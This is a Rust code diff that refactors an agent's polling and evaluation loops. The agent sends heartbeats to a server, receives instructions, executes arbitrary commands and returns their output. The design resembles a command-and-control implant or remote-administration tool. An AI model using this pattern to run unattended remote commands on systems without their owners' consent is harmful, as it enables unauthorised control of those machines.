@@ -46,12 +46,12 @@ async fn poll(state: Arc<RwLock<State>>) {
     loop {
         interval.tick().await;
 
-        let response_body = match state.write().await.get_pending_response() {
+        let response = match state.write().await.get_pending_response() {
             Some(response) => response,
-            None => AgentResponseBody::Heartbeat,
+            None => (None, AgentResponseBody::Heartbeat),
         };
 
-        let response = state.write().await.gen_response(response_body);
+        let response = state.write().await.gen_response(response.1, response.0);
         let instruction = state.read().await.send_response(response).await;
 
         match instruction {
@@ -61,7 +61,7 @@ async fn poll(state: Arc<RwLock<State>>) {
                 state
                     .write()
                     .await
-                    .push_instruction(instruction.packet_body);
+                    .push_instruction(instruction.body, instruction.header.packet_id);
             }
             Err(err) => {
                 devlog!("Failed to properly communicate with server: {:#?}", err);
@@ -78,39 +78,28 @@ async fn eval(state: Arc<RwLock<State>>) {
 
     devlog!("Evaluating instruction: {:#?}", instruction);
 
-    match instruction {
+    match instruction.1 {
         AgentInstructionBody::Command {
             ref command,
-            ref command_id,
             ref args,
         } => {
-            devlog!(
-                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
-                command,
-                command_id,
-                args
-            );
-
-            // Execute the received command with arguments
             let output: Output = Command::new(command).args(args).output().await.unwrap();
 
-            // Capture stdout, stderr, and status code
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
-
-            // Print the output for debugging
-            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
+            let status_code = output.status.code().unwrap_or(-1);
 
             let response_body = AgentResponseBody::CommandResponse {
                 command: command.to_string(),
-                command_id: *command_id,
                 status_code,
                 stdout,
                 stderr,
             };
 
-            state.write().await.push_response(response_body);
+            state
+                .write()
+                .await
+                .push_response(response_body, Some(instruction.0));
         }
         AgentInstructionBody::Script { script } => {
             task::spawn_blocking(move || {
